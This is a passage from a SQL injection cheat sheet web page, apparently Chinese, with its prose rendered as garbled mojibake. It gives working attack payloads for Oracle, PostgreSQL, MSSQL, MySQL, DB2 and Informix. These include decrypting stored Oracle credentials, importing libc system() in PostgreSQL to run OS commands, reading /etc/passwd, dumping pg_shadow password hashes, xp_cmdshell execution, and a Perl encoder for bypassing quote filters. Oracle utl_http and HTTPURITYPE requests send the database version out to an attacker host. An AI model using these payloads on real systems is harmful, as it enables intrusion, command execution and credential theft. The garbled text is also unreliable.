sysman<span class="token punctuation">.</span>mgmt_credentials2<span class="token punctuation">;</span><span class="token keyword">select</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>aru_username<span class="token punctuation">)</span><span class="token punctuation">,</span> sysman<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>aru_password<span class="token punctuation">)</span> <span class="token keyword">from</span> sysman<span class="token punctuation">.</span>mgmt_aru_credentials<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="PostgreSQL-å¤‡å¿˜å•"><a href="#PostgreSQL-å¤‡å¿˜å•" class="headerlink" title="PostgreSQL å¤‡å¿˜å•"></a>PostgreSQL å¤‡å¿˜å•</h4><p><a href="http://www.postgresql.org/docs/manuals/">www.postgresql.org/docs/manuals/</a></p><ol><li>æšä¸¾æ•°æ®åº“é…ç½®ä¿¡æ¯å’Œæ¨¡å¼</li></ol><p>æå–PostgreSQLæ•°æ®åº“çš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>ç‰ˆæœ¬</td><td><code>SELECT version()</code></td></tr><tr><td>å½“å‰ç”¨æˆ·</td><td><code>SELECT getpgusername();  </code><br><code>SELECT user; </code><br> <code>SELECT current user; </code> <br><code>SELECT session user;</code></td></tr><tr><td>åˆ—å‡ºç”¨æˆ·</td><td><code>SELECT usename FROM pg_user</code></td></tr><tr><td>å½“å‰ç”¨æˆ·æƒé™</td><td><code>SELECT  usename, usecreatedb, usesuper, usecatupd FROM pg_user</code></td></tr><tr><td>æ•°æ®åº“æœåŠ¡å™¨ä¸»æœºå</td><td><code>SELECT inet_server_addr();</code></td></tr></tbody></table><p>æå–PostgreSQLæ•°æ®åº“çš„æ¨¡å¼ä¿¡æ¯</p><table><thead><tr><th>æ•°</th><th>æŸ¥è¯¢</th></tr></thead><tbody><tr><td>å½“å‰æ•°æ®åº“</td><td><code>SELECT current_database();</code></td></tr><tr><td>åˆ—å‡ºæ•°æ®åº“</td><td><code>SELECT datname FROM pg_database;</code></td></tr><tr><td>åˆ—å‡ºè¡¨</td><td><code>SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN ('r' ,'') AND pg_catalog.pg_table_is_visible(c.oid) AND n.nspname NOT IN ('pg_catalog','pg_toast');</code></td></tr><tr><td>åˆ—å‡ºåˆ—</td><td><code>SELECT relname,A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T  WHERE (C.relkind='r') AND (N.nspname ='public') AND  (A.attrelid=C.oid) AND (N.oid=C.relnamespace) AND (A.atttypid=T.oid)  AND(A.attnum&gt;0) AND (NOT A.attisdropped);</code></td></tr></tbody></table><ol start="2"><li>SQLç›²æ³¨å‡½æ•°ï¼šPostgreSQL</li></ol><p>SQLç›²æ³¨å‡½æ•°</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²é•¿åº¦</td><td><code>LENGTH()</code></td></tr><tr><td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æå–å­ä¸²</td><td><code>SUBSTRING(string,offset,length)</code></td></tr><tr><td>å­—ç¬¦ä¸²(â€˜ABC)ä¸å¸¦å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td><td>`SELECT CHR(65)</td></tr><tr><td>è§¦å‘æ—¶é—´å»¶è¿Ÿ</td><td><code>SELECT pg_sleep(10); --è§¦å‘10sçš„å»¶è¿Ÿ</code></td></tr></tbody></table><ol start="3"><li>æ”»å‡»æ•°æ®åº“æœåŠ¡å™¨ï¼šPostgreSQL</li></ol><p>PostgreSQLå¹¶æœªæä¾›æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤çš„å†…ç½®å­˜å‚¨è¿‡ç¨‹ï¼Œä¸è¿‡å¯ä»¥ä»å¤–éƒ¨çš„.dllæˆ–å…±äº«å¯¹è±¡(shared object)(.so)æ–‡ä»¶ä¸­å¯¼å…¥å µå¦‚system()è¿™æ ·çš„å‡½æ•°ã€‚å€ŸåŠ©PostgreSQLå¹¶ä½¿ç”¨COPYè¯­å¥åŒæ ·å¯ä»¥è¯»å–æœ¬åœ°æ–‡ä»¶ã€‚</p><ul><li>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li></ul><p>å¯¹äº8.2ç‰ˆæœ¬ä¹‹å‰çš„PostgreSQLæ•°æ®åº“æœåŠ¡å™¨ï¼Œä»æ ‡å‡†UNIX libcåº“å¯¼å…¥systemå‡½æ•°ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token operator">OR</span> <span class="token keyword">REPLACE</span> <span class="token keyword">FUNCTION</span> system<span class="token punctuation">(</span>cstring<span class="token punctuation">)</span> <span class="token keyword">RETURNS</span> <span class="token keyword">int</span> <span class="token keyword">AS</span> <span class="token string">'/lib/libc.so.6'</span><span class="token punctuation">,</span> <span class="token string">'system'</span> <span class="token keyword">LANGUAGE</span> <span class="token string">'C'</span> STRICT<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ¥ä¸‹æ¥å¯ä»¥é€šè¿‡æ‰§è¡Œä¸‹åˆ—SQLæŸ¥è¯¢è°ƒç”¨systemå‡½æ•°ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> system<span class="token punctuation">(</span><span class="token string">'command'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>è®¿é—®æœ¬åœ°æ–‡ä»¶</li></ul><p>å¯ä»¥ä½¿ç”¨ä¸‹åˆ—SQLè¯­å¥å¹¶å€ŸåŠ©è¶…çº§ç”¨æˆ·è´¦æˆ·æ¥è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶æ˜¯ä½¿ç”¨æ“ä½œç³»ç»Ÿçº§çš„PostgreSQLç”¨æˆ·è´¦æˆ·æ‰“å¼€çš„</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> filedata<span class="token punctuation">(</span>t <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY filedata <span class="token keyword">FROM</span> <span class="token string">'/etc/passwd'</span><span class="token punctuation">;</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å¯ä»¥ä½¿ç”¨ä¸‹åˆ—SQLè¯­å¥æ¥å†™æœ¬åœ°æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ä¹Ÿæ˜¯ä½¿ç”¨æ“ä½œç³»ç»Ÿçº§çš„PostgreSQLç”¨æˆ·è´¦æˆ·åˆ›å»ºçš„</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> thefile<span class="token punctuation">(</span>evildata <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> thefile<span class="token punctuation">(</span>evildata<span class="token punctuation">)</span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token string">'some evil data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>COPY thefile <span class="token punctuation">(</span>evildata<span class="token punctuation">)</span> <span class="token keyword">TO</span> <span class="token string">'/tmp/evilscript.sh'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>ç ´è§£æ•°æ®åº“å£ä»¤</li></ul><p>åˆ—å‡ºPostgreSQLæ•°æ®åº“ä¸­çš„ç”¨æˆ·åå’Œå£ä»¤</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> usename<span class="token operator">||</span><span class="token string">':'</span><span class="token operator">||</span>passwd <span class="token keyword">from</span> pg_shadow<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="é¿å¼€è¾“å…¥éªŒè¯è¿‡æ»¤å™¨"><a href="#é¿å¼€è¾“å…¥éªŒè¯è¿‡æ»¤å™¨" class="headerlink" title="é¿å¼€è¾“å…¥éªŒè¯è¿‡æ»¤å™¨"></a>é¿å¼€è¾“å…¥éªŒè¯è¿‡æ»¤å™¨</h3><h4 id="å¼•å·è¿‡æ»¤å™¨"><a href="#å¼•å·è¿‡æ»¤å™¨" class="headerlink" title="å¼•å·è¿‡æ»¤å™¨"></a>å¼•å·è¿‡æ»¤å™¨</h4><p>ä¸ä½¿ç”¨å¼•å·å­—ç¬¦è¡¨ç¤ºå­—ç¬¦ä¸²</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>å¹³   å°</td><td>æŸ¥  è¯¢</td></tr><tr><td>Microsoft SQL Server</td><td><code>SELECT char(0x41) + char(0x42) + char(0x43);</code></td></tr><tr><td>MySQL Server</td><td><code>SELECT char (65,66,67);</code><br><code>  SELECT 0x414243;</code></td></tr><tr><td>Oracle</td><td>`SELECT chr(65)</td></tr><tr><td>PostgreSQL</td><td>`SELECT chr(65)</td></tr></tbody></table><p>Microsoft SQL Serverè¿˜æ”¯æŒåœ¨å˜é‡ä¸­æ„é€ æŸ¥è¯¢ï¼Œç„¶åè°ƒç”¨EXECæ¥æ‰§è¡Œå®ƒã€‚</p><p>åˆ›å»ºäº†ä¸€ä¸ªåä¸º@qçš„å˜é‡ï¼Œå¹¶å€ŸåŠ©ä¸€ä¸ªåå…­è¿›åˆ¶ç¼–ç çš„å­—ç¬¦ä¸²å°†SELECTâ€™ABCâ€™æŸ¥è¯¢èµ‹å€¼ç»™è¯¥å˜é‡ï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DECLARE</span> <span class="token variable">@q</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token keyword">SELECT</span> <span class="token variable">@q</span><span class="token operator">=</span><span class="token number">0x53454c454354202741424327</span><span class="token keyword">EXEC</span><span class="token punctuation">(</span><span class="token variable">@q</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>é‡‡ç”¨è¯¥æŠ€æœ¯å¯ä»¥åœ¨ä¸å‘åº”ç”¨ç¨‹åºæäº¤ä»»ä½•å¼•å·å­—ç¬¦çš„å‰æä¸‹ï¼Œæ‰§è¡Œä»»æ„æŸ¥è¯¢ã€‚å¯ä»¥ä½¿ç”¨ä¸‹åˆ—Perlè„šæœ¬å¹¶å€ŸåŠ©è¯¥æŠ€æœ¯æ¥è‡ªåŠ¨ç¼–ç SQLè¯­å¥ï¼š</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token comment">#!/usr/bin/perl</span><span class="token keyword">print</span> <span class="token string">"Enter SQL query to encode:"</span><span class="token punctuation">;</span><span class="token variable">$teststr</span><span class="token operator">=</span><span class="token filehandle symbol">&lt;STDIN&gt;</span><span class="token punctuation">;</span>chomp <span class="token variable">$teststr</span><span class="token punctuation">;</span><span class="token variable">$hardcoded_sql</span> <span class="token operator">=</span><span class="token string">'declare @q varchar(8000)'</span><span class="token operator">.</span><span class="token string">'select @q=0x***'</span><span class="token operator">.</span><span class="token string">'exec(@q)'</span><span class="token punctuation">;</span><span class="token variable">$prepared</span> <span class="token operator">=</span> encode_sql<span class="token punctuation">(</span><span class="token variable">$teststr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$hardcoded_sql</span> <span class="token operator">=~</span><span class="token regex">s/\*\*\*/$prepared/g</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token string">""</span><span class="token operator">\</span>n<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span><span class="token operator">-</span>Encoded SQL<span class="token punctuation">:</span><span class="token operator">\</span>n<span class="token operator">\</span>n<span class="token string">";print $hardcoded_sql ."</span><span class="token operator">\</span>n<span class="token string">";sub encode_sql{@subvar=@_;my $sqlstr =$subvar[0];@ASCII = unpack("</span>C<span class="token operator">*</span>"<span class="token punctuation">,</span><span class="token variable">$sqlstr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token variable">$line</span> <span class="token punctuation">(</span><span class="token variable">@ASCII</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$encoded</span> <span class="token operator">=</span> sprintf<span class="token punctuation">(</span><span class="token string">'%lx'</span><span class="token punctuation">,</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$encoded_command</span> <span class="token operator">.=</span><span class="token variable">$encoded</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">return</span> <span class="token variable">$encoded_command</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="HTTP-ç¼–ç "><a href="#HTTP-ç¼–ç " class="headerlink" title="HTTP ç¼–ç "></a>HTTP ç¼–ç </h4><p>æœ‰æ—¶å¯ä»¥ä½¿ç”¨å¤–æ¥ç¼–ç æ ‡å‡†æˆ–è€…å€ŸåŠ©åŒé‡ç¼–ç æ¥ç¼–ç è¾“å…¥ï¼Œä»¥é¿å¼€é‚£äº›æ‹’ç»å·²çŸ¥ä¸è‰¯å­—ç¬¦ (é€šå¸¸ç§°ä¸ºé»‘åå•)çš„è¾“å…¥éªŒè¯è¿‡æ»¤å™¨ã€‚</p><p>ç¼–ç åçš„SQLå…ƒå­—ç¬¦</p><table><thead><tr><th>å­—   ç¬¦</th><th>ç¼–ç åçš„å˜é‡</th></tr></thead><tbody><tr><td>â€˜</td><td>%27<br>%2527<br>%u0027<br>%u02b9<br>%ca%b9</td></tr><tr><td>â€œ</td><td>%22<br>%2522<br>%u0022<br>%uff02<br>%ef%bc%82</td></tr><tr><td>;</td><td>%3b<br>%253b<br>%u0003b<br>%ufflb<br>%ef%bc%9b</td></tr><tr><td>(</td><td>%28<br>%2528<br>%u0028<br>%uff08<br>%ef%bc%88</td></tr><tr><td>)</td><td>%29<br>%2529<br>%u0029<br>%uff09<br>%ef%bc%89</td></tr><tr><td>ï¼»ç©ºæ ¼ï¼½</td><td>%20<br>%2520<br>%u0020<br>%ff00<br>%c0%a0</td></tr></tbody></table><h3 id="æ’æŸ¥SQLæ³¨å…¥æ”»å‡»"><a href="#æ’æŸ¥SQLæ³¨å…¥æ”»å‡»" class="headerlink" title="æ’æŸ¥SQLæ³¨å…¥æ”»å‡»"></a>æ’æŸ¥<strong>SQL</strong>æ³¨å…¥æ”»å‡»</h3><p>æ’æŸ¥SQLæ³¨å…¥æ—¶çš„å‚è€ƒèµ„æ–™</p><table><thead><tr><th>è§£å†³æ–¹æ¡ˆ</th><th>é”™è¯¯/æŒ‘æˆ˜</th></tr></thead><tbody><tr><td>æŒ‘æˆ˜<br>æ‰§è¡Œä¸€æ¬¡UNION SELECTæ”»å‡»ï¼Œå…¶åŸå§‹æŸ¥è¯¢ç”¨äºæ£€ç´¢imageç±»å‹çš„åˆ—ã€‚<br>é”™è¯¯æ¶ˆæ¯<br> <code>Image is incompatible with int/ The image data type cannot be selected as DISTINCT because it is not compatible.</code></td><td>å°†<code>UNION SELECT</code>è¯­å¥ä¿®æ”¹æˆè¯»<code>UNION ALL SELECT</code><br>è¿™æ ·èƒ½è§£å†³å½“<code>UNION SELECT</code>å°è¯•ä¸imageæ•°æ®ç±»å‹è¿›è¡Œæ¯”è¾ƒæ“ä½œæ—¶å‡ºç°çš„ç›¸å…³é—®é¢˜ã€‚<br>ä¾‹å¦‚ï¼š<code>UNION ALL SELECT null,null,null</code></td></tr><tr><td>æŒ‘æˆ˜<br>æ³¨å…¥ORDER BYå­å¥<br>æ³¨å…¥çš„æ•°æ®ä½äºORDER BYå­å¥å³è¾¹ã€‚è®¸å¤šå¸¸ç”¨çš„æŠ€å·§ï¼ˆæ¯”å¦‚UNION SELECTï¼‰å°†ä¸èµ·ä½œç”¨ã€‚<br>æœ¬ä¾‹æ‰§è¡Œä¸‹åˆ—SQLæŸ¥è¯¢ï¼Œå…¶ä¸­æ”»å‡»è€…çš„æ•°æ®æ˜¯æ³¨å…¥ç‚¹ï¼š<code>SELECT  FROM products GROUP BY attackers data DESC</code></td><td>Microsoft SQL Server <br>Microsoft SQL Serveræ”¯æŒä½¿ç”¨åˆ†å·(;)ä½œä¸ºæ¯ä¸ªæ–°æŸ¥è¯¢çš„å †å æŸ¥è¯¢çš„å¼€å§‹ã€‚å¯ä»¥æŒ‰ä¸‹åˆ—æ–¹å¼æ¥å®æ–½å¤šç§æ”»å‡»ï¼Œæ¯”å¦‚åŸºäºæ—¶é—´å»¶è¿Ÿçš„æ•°æ®æ£€ç´¢å’Œæ‰©å±•å­˜å‚¨è¿‡ç¨‹çš„æ‰§è¡Œï¼š<br><code>ORDER BY 1ï¼›EXEC master..xp_cmdshell'cmd'</code><br>è¿˜å¯ä»¥åˆ©ç”¨Microsoft SQL Serverå¹¶é€šè¿‡é”™è¯¯æ¶ˆæ¯æ¥è¿”å›æŸ¥è¯¢ç»“æœæ•°æ®ã€‚æ³¨å…¥ORDER BYå­å¥æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—è¯­æ³•ï¼š<br><code>ORDER BY (1/(@@version)); -- è¿”å›ç‰ˆæœ¬å·</code><br><code>ORDER BY 1/(SELECT TOP 1 name FROM sysobjects WHERE xtype='U');--ä»sysobjectsè¿”å›åç§°</code><br>MySQL Server<br>å¯ä»¥åœ¨ORDER BYå­å¥ä¸­ä½¿ç”¨åŸºäºæ—¶é—´å»¶è¿Ÿçš„SQLç›²æ³¨ã€‚å¦‚æœå½“å‰ç”¨æˆ·ä¸ºroot@localhostï¼Œé‚£ä¹ˆä¸‹é¢çš„ä¾‹å­ä¼šè§¦å‘æ—¶é—´å»¶è¿Ÿï¼š<br><code>ORDER BY(IF((SELECT user()='root@localhost'),sleep(2),1));</code><br>Oracleå¯ä»¥ä½¿ç”¨utl_httpåŒ…å¹¶é€šè¿‡æ”»å‡»è€…é€‰æ‹©çš„ä»»ä½•TCPç«¯å£æ¥å»ºç«‹å‘å¤–çš„HTTPè¿æ¥ã€‚æ¥ä¸‹æ¥çš„ORDER BYå­å¥é€šè¿‡ç«¯å£1000ä¸ä¸»æœºæ”»å‡»è€…å»ºç«‹äº†ä¸€æ¡HTTPè¿æ¥ã€‚<br>è¯¥HTTPè¯·æ±‚åœ¨è¯·æ±‚è·¯å¾„ä¸­åŒ…å«äº†Oracleçš„ç‰ˆæœ¬æ ‡å¿—ï¼š`ORDER BY utl_http.request(â€˜<a href="http://attacker:1000/">http://attacker:1000/</a>â€˜</td></tr><tr><td>æŒ‘æˆ˜<br>å› ä¸ºåˆ é™¤äº†å…¬å…±æƒé™ï¼Œæ‰€ä»¥ut httpæ— æ³•èµ·ä½œç”¨ã€‚<br>é”™è¯¯æ¶ˆæ¯<br><code>ORA-00904 invalid identifier</code></td><td>è®¸å¤šOracleå®‰å…¨æŒ‡å—å»ºè®®ä»utl_httpåŒ…ä¸­åˆ é™¤å…¬å…±æƒé™ã€‚ä¸è¿‡ï¼Œå¾ˆå¤šäººå¿½è§†è¿™æ ·ä¸€ä¸ªäº‹å®å¯ä½¿ç”¨ HTTPURITYPEå¯¹è±¡ç±»å‹å®ç°ç›¸åŒçš„ç›®çš„ï¼Œè€Œä¸”åŒæ ·èƒ½è¢«å…¬å…±æƒé™è®¿é—®åˆ°ã€‚<br>`SELECT HTTPURITYPE(â€˜<a href="http://attacker:1000/">http://attacker:1000/</a>â€˜</td></tr><tr><td>æŒ‘æˆ˜<br>utl inaddrä¸èµ·ä½œç”¨ã€‚<br>å­˜åœ¨å¤šç§åŸå› ï¼Œæ¯”å¦‚ç‰ˆæœ¬11ä¸­çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ï¼Œæƒé™å·²ç»è¢«æ’¤é”€ä»¥åŠæœªå®‰è£…Javaç­‰ã€‚<br>é”™è¯¯æ¶ˆæ¯<br><code>ORA-00904 invalid identifier ORA-24247 network access denied by access control list ACLï¼‰-11g ORA-29540 oracle/plsql/net/InternetAddress</code></td><td>åœ¨å¯ä»¥æ§åˆ¶é”™è¯¯æ¶ˆæ¯å†…å®¹çš„ä½ç½®ä½¿ç”¨ä¸åŒçš„å‡½æ•°ã€‚æ ¹æ®æ•°æ®åº“ç‰ˆæœ¬åŠå®‰è£…ç»„ä»¶çš„ä¸åŒï¼Œä¸‹é¢æ˜¯å€™é€‰å‡½æ•°çš„ä¸€ä¸ªåˆ—è¡¨ï¼š<br><code>ORDER BY ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE rownum=1),null,null) ORDER BY SYS.DBMS_AW_XML.READAWMETADATA((SELECT banner FROM v$version WHERE rownum=1),null) ORDER BY CTXSYS.DRITHSX.SN((SELECT banner FROM v$version WHERE rownum=1),user)ORDER BY CTXSYS.CTX_REPORT.TOKEN_TYPE(user,(SELECT banner FROM v$version WHERE rownum=1))</code></td></tr><tr><td>æŒ‘æˆ˜<br>æ‰§è¡Œé’ˆå¯¹MySQLæ•°æ®åº“çš„UNION SELECTæ”»å‡»æ—¶æ”¶åˆ°<code>illegal mix of collations</code>æ¶ˆæ¯ã€‚<br>é”™è¯¯æ¶ˆæ¯<br><code>illegal mix of collations(latinl_swedish_ci,IMPLICIT) and(utf8_general_ci,SYSCONST)for operation 'UNION'</code></td><td>å¯ä»¥ä½¿ç”¨CASTå‡½æ•°è§£å†³è¯¥é”™è¯¯ã€‚<br>ä¾‹å¦‚ï¼š<br><code>UNION SELECT user(),null,null;</code><br>å˜ä¸ºï¼š<br><code>UNION SELECT CAST(user() ASchar),null,null;</code></td></tr><tr><td>æŒ‘æˆ˜<br>æ‰§è¡Œé’ˆå¯¹Microsoft SQL Serveræ•°æ®åº“çš„UNION SELECTæ”»å‡»æ—¶æ”¶åˆ°<code>collation conflict"</code>æ¶ˆæ¯ã€‚<br>é”™è¯¯æ¶ˆæ¯<br><code>Cannot resolve collation conflict for column 2 in SELECT statement</code></td><td>è¦æƒ³è§£å†³è¯¥é”™è¯¯ï¼Œä¸€ç§æ–¹æ³•æ˜¯ä»æ•°æ®åº“è¯»å–Collationå±æ€§ï¼Œç„¶ååœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æ‰§è¡Œ<code>UNION ALL SELECT</code>æŸ¥è¯¢æ¥æ£€ç´¢sysobjectè¡¨ä¸­çš„nameåˆ—ã€‚<br>æ­¥éª¤1ï¼šæ£€ç´¢collationçš„å€¼<br><code>UNION ALL SELECT SERVERPROPERTYï¼ˆ'Collation'ï¼‰ï¼Œnull FROM sysobjects</code><br>æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†Collationå±æ€§è®¾ç½®ä¸º<code>SQL_Latinl_General_CPl_CI_AS</code><br>æ­¥éª¤2ï¼šåœ¨<code>UNION SELECT</code>ä¸­å®ç°collationçš„å€¼<code>UNION ALL SELECT 1,Name collate SQL Latinl General CPl_CI_AS,null FROM sysobjects</code></td></tr></tbody></table><h3 id="å…¶ä»–å¹³å°ä¸Šçš„SQLæ³¨å…¥"><a href="#å…¶ä»–å¹³å°ä¸Šçš„SQLæ³¨å…¥" class="headerlink" title="å…¶ä»–å¹³å°ä¸Šçš„SQLæ³¨å…¥"></a>å…¶ä»–å¹³å°ä¸Šçš„<strong>SQL</strong>æ³¨å…¥</h3><h4 id="DB2å¤‡å¿˜å•"><a href="#DB2å¤‡å¿˜å•" class="headerlink" title="DB2å¤‡å¿˜å•"></a>DB2å¤‡å¿˜å•</h4><p>åœ¨ä¸Webåº”ç”¨é›†æˆçš„ä¼—å¤šæ•°æ®åº“ä¸­ï¼ŒIBMçš„DB2æ•°æ®åº“æœåŠ¡å™¨å¯èƒ½æ˜¯å…¶ä¸­æœ€ä¸æµè¡Œçš„ä¸€ç§æ•°æ®åº“å¹³å°ã€‚ä¸è¿‡ï¼ŒLinuxã€UNIXå’ŒWindowsç‰ˆæœ¬(DB2 LUW)æ­£æ—¥æ¸æµè¡Œã€‚</p><ol><li>æšä¸¾æ•°æ®åº“é…ç½®ä¿¡æ¯å’Œæ¨¡å¼</li></ol><p>æå–DB2æ•°æ®åº“çš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>ç‰ˆæœ¬</td><td><code>SELECT versionnumber, version_timestamp  FROM sysibm.sysversions;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·</td><td><code>SELECT user FROM sysibm.sysdummy1;</code><br><code>SELECT session_user FROM sysibm.sysdummyl;</code><br><code> SELECT system_user FROM sysibm.sysdummyl;</code></td></tr><tr><td>åˆ—å‡ºç”¨æˆ·</td><td><code>SELECT grantee FROM syscat.dbauth;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·æƒé™</td><td><code>SELECT * FROM syscat.dbauth WHERE  grantee =user;</code><br><code> SELECT * FROM syscat.tabauth WHERE grantee =user;</code><br><code> SELECT *  FROM syscat.tabauth;</code></td></tr></tbody></table><p>æå–DB2æ•°æ®åº“çš„æ¨¡å¼ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å½“å‰æ•°æ®åº“</td><td><code>SELECT current_server FROM sysibm.sysdummyl;</code></td></tr><tr><td>åˆ—å‡ºæ•°æ®åº“</td><td><code>SELECT schemaname FROM syscat.schemata;</code></td></tr><tr><td>åˆ—å‡ºè¡¨</td><td><code>SELECT name FROM sysibm.systables;</code></td></tr><tr><td>åˆ—å‡ºåˆ—</td><td><code>SELECT name, tbname, coltype FROM sysbibm.syscolumns;</code></td></tr></tbody></table><ol start="2"><li>SQLç›²æ³¨å‡½æ•°ï¼šDB2</li></ol><p>SQLç›²æ³¨å‡½æ•°</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥  è¯¢</th></tr></thead><tbody><tr><td>å­—ç¬¦ä¸²é•¿åº¦</td><td><code>LENGTH()</code></td></tr><tr><td>ä»ç»™å®šå­—ç¬¦ä¸²ä¸­æå–å­ä¸²</td><td><code>SUBSTRING(string,offset,length) FROM  sysibm.sysdummyl;</code></td></tr><tr><td>å­—ç¬¦ä¸²(â€˜ABCâ€™)ä¸å¸¦å•å¼•å·çš„è¡¨ç¤ºæ–¹å¼</td><td>`SELECT CHR(65)</td></tr></tbody></table><h4 id="Informix-å¤‡å¿˜å•"><a href="#Informix-å¤‡å¿˜å•" class="headerlink" title="Informix å¤‡å¿˜å•"></a>Informix å¤‡å¿˜å•</h4><p>Informixæ•°æ®åº“æœåŠ¡å™¨ä¹Ÿæ˜¯ç”±IBMè´Ÿè´£ç»é”€çš„ï¼Œç›¸æ¯”å…¶ä»–æ•°æ®åº“å¹³å°ï¼Œå®ƒä¸æ˜¯å¾ˆå¸¸è§ã€‚</p><ol><li>æšä¸¾æ•°æ®åº“é…ç½®ä¿¡æ¯å’Œæ¨¡å¼</li></ol><p>æå–Informixæ•°æ®åº“çš„é…ç½®ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>ç‰ˆæœ¬</td><td><code>SELECT DBINFO('version','full') FROM systables WHERE tabid = 1;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·</td><td><code>SELECT USER FROM systables WHERE tabid = 1;</code></td></tr><tr><td>åˆ—å‡ºç”¨æˆ·</td><td><code>select usertype,username,password from sysusers;</code></td></tr><tr><td>å½“å‰ç”¨æˆ·æƒé™</td><td><code>select tabname, tabauth, grantor, grantee FROM systabauth join systables on systables.tabid = systabauth.tabid</code></td></tr><tr><td>æ•°æ®åº“æœåŠ¡å™¨ä¸»æœºå</td><td><code>SELECT DBINFO('dbhostname') FROM systables WHERE tabid=1;</code></td></tr></tbody></table><p> æå–Informixæ•°æ®åº“çš„æ¨¡å¼ä¿¡æ¯</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥   è¯¢</th></tr></thead><tbody><tr><td>å½“å‰æ•°æ®åº“</td><td><code>SELECT DBSERVERNAME FROM systables WHERE tabid = 1;</code></td></tr><tr><td>åˆ—å‡ºæ•°æ®åº“</td><td><code>SELECT name, owner FROM sysdatabases;</code></td></tr><tr><td>åˆ—å‡ºè¡¨</td><td><code>SELECT tabname FROM systables; </code><br><code> SELECT tabname, viewtext FROM sysviews join systables on systables.tabid = sysviews.tabid;</code></td></tr><tr><td>åˆ—å‡ºåˆ—</td><td><code>SELECT tabname, colname, coltype FROM  syscolumns join systables on  syscolumns.tabid = systables.tabid;</code></td></tr></tbody></table><ol start="2"><li>SQL ç›²æ³¨å‡½æ•°ï¼šInformix</li></ol><p>SQLç›²æ³¨å‡½æ•°</p><table><thead><tr><th>æ•°   æ®</th><th>æŸ¥  